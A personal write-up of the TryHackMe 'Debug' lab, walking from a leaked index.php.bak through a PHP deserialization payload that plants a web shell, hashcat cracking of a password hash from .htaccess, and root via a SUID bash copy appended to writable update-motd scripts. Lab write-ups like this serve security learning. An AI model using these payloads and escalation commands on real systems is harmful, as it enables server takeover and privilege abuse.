# Debug

https://tryhackme.com/room/debug

A relatively simple room, with a php deserialization foot hold and then a quirk of ubuntu writable files to get to root.

1. Recon revealed 22 and 80. I ran nikto against 80, which revealed a backup folder.
2. The backup folder included a index.html.bak (which was the apache default page I saw when browsing to /) and an index.php.bak
3. Within the php backup, was a deserialization exploit:

```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


?>
```

Notable, that $debug bit near the end.

4. To exploit this, I created the following payload:

`O:10:"FormSubmit":2:{s:9:"form_file";s:8:"test.php";s:7:"message";s:26:"<?php+system($_GET[1]);+?>";}`

And triggered it by navigating to `/index.php?debug=<payload>`. Afterwards, browsing to `/test.php?1=ls` showed a file listing.

5. In the web folder was an .htaccess file. I opened this and got a username of james and a hashed password. Breaking the hash with `hashcat.exe -m 1600 hash rockyou.txt` got me a password quickly, which when tested against SSH worked.

6. On the box, in james home folder, was the user flag and a message:

```
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it?

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :)

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```

7. There are various ways to set a welcome message, so to check what I could 'modify', I ran `find /etc/ -writable`. This revealed all the files under `/etc/update-motd.d` were writable:

```
total 44
drwxr-xr-x   2 root root   4096 Mar 10 18:38 .
drwxr-xr-x 134 root root  12288 Mar 10 20:08 ..
-rwxrwxr-x   1 root james  1220 Mar 10 18:32 00-header
-rwxrwxr-x   1 root james     0 Mar 10 18:38 00-header.save
-rwxrwxr-x   1 root james  1157 Jun 14  2016 10-help-text
-rwxrwxr-x   1 root james    97 Dec  7  2018 90-updates-available
-rwxrwxr-x   1 root james   299 Jul 22  2016 91-release-upgrade
-rwxrwxr-x   1 root james   142 Dec  7  2018 98-fsck-at-reboot
-rwxrwxr-x   1 root james   144 Dec  7  2018 98-reboot-required
-rwxrwxr-x   1 root james   604 Nov  5  2017 99-esm
```

8. On ubuntu, these are all basically scripts that are run by root: http://manpages.ubuntu.com/manpages/bionic/man5/update-motd.5.html. To exploit this, I ran the following: `echo "cp /bin/bash /home/james/bash && chmod u+s /home/james/bash" >> 00-header`

9. Logging back out and in resulted in bash sitting in james home folder, with the suid bit set, and got to root via `./bash -p`. The root flag was in the normal place :)
